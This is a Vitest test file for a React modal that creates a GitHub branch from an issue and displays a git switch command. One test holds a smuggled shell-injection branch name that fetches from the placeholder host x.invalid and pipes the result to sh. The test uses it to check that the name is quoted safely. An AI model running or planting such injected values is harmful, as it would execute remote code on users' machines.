import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { render, screen } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { MemoryRouter } from 'react-router';
import { beforeEach, describe, expect, it, vi } from 'vitest';

const account = vi.hoisted(() => ({ get: vi.fn() }));
const branch = vi.hoisted(() => ({ create: vi.fn() }));

vi.mock('@/api/github.api', () => ({
  GITHUB_ACCOUNT_KEY: ['github-account'],
  issueDevelopmentKey: (id: string, n: string, issueId: string) => [
    'issue-development',
    id,
    n,
    issueId,
  ],
  githubAccountApi: account,
  githubBranchApi: branch,
}));

import { CreateBranchModal } from './CreateBranchModal';

let client: QueryClient;
const onClose = vi.fn();

function show() {
  client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  render(
    <QueryClientProvider client={client}>
      <MemoryRouter>
        <CreateBranchModal
          open
          onClose={onClose}
          projectId="p1"
          issueNumber="7"
          issueId="i7"
          issueKey="AXM-7"
          issueTitle="Fix the login timeout"
          defaultBranch="main"
        />
      </MemoryRouter>
    </QueryClientProvider>,
  );
}

describe('CreateBranchModal', () => {
  beforeEach(() => {
    account.get.mockReset();
    branch.create.mockReset();
    account.get.mockResolvedValue({ connected: true, login: 'mira-dev' });
  });

  it('prefills the name and the default branch', async () => {
    show();
    expect(await screen.findByLabelText('Branch name')).toHaveValue('axm-7-fix-the-login-timeout');
    expect(screen.getByLabelText('Start from')).toHaveValue('main');
  });

  it('sends the edited name and base, then shows the command to switch to the branch', async () => {
    branch.create.mockResolvedValue({
      name: 'axm-7-login',
      url: 'https://github.com/acme-labs/widget/tree/axm-7-login',
      headSha: 'a'.repeat(40),
    });
    show();
    const name = await screen.findByLabelText('Branch name');
    await userEvent.clear(name);
    await userEvent.type(name, 'axm-7-login');
    const from = screen.getByLabelText('Start from');
    await userEvent.clear(from);
    await userEvent.type(from, 'develop');
    await userEvent.click(screen.getByRole('button', { name: 'Create branch' }));

    expect(branch.create).toHaveBeenCalledWith('p1', 7, {
      name: 'axm-7-login',
      from: 'develop',
    });
    expect(
      await screen.findByDisplayValue("git fetch origin && git switch 'axm-7-login'"),
    ).toHaveAttribute('readonly');
  });

  it('quotes the branch name for the shell in the switch command', async () => {
    const name = "axm-7;curl${IFS}x.invalid|sh'";
    branch.create.mockResolvedValue({ name, url: 'https://x.invalid', headSha: 'a' });
    show();
    await userEvent.click(await screen.findByRole('button', { name: 'Create branch' }));
    expect(
      await screen.findByDisplayValue(
        "git fetch origin && git switch 'axm-7;curl${IFS}x.invalid|sh'\\'''",
      ),
    ).toBeInTheDocument();
  });

  it('refreshes the development panel after a success', async () => {
    branch.create.mockResolvedValue({ name: 'axm-7-x', url: 'https://x.invalid', headSha: 'a' });
    show();
    const spy = vi.spyOn(client, 'invalidateQueries');
    await userEvent.click(await screen.findByRole('button', { name: 'Create branch' }));
    await screen.findByDisplayValue(/git switch 'axm-7-x'/);
    expect(spy).toHaveBeenCalledWith({ queryKey: ['issue-development', 'p1', '7', 'i7'] });
  });

  it('shows the server message when the branch exists', async () => {
    branch.create.mockRejectedValue(new Error('The branch axm-7-fix already exists'));
    show();
    await userEvent.click(await screen.findByRole('button', { name: 'Create branch' }));
    expect(await screen.findByRole('alert')).toHaveTextContent(
      'The branch axm-7-fix already exists',
    );
    // The form stays, so the name can be changed
    expect(screen.getByLabelText('Branch name')).toBeInTheDocument();
  });

  it('shows a notice with a link to the GitHub settings when you are not connected', async () => {
    account.get.mockResolvedValue({ connected: false });
    show();
    const link = await screen.findByRole('link', { name: /connect github/i });
    expect(link).toHaveAttribute('href', '/settings/github');
    expect(screen.queryByLabelText('Branch name')).toBeNull();
    expect(branch.create).not.toHaveBeenCalled();
  });
});
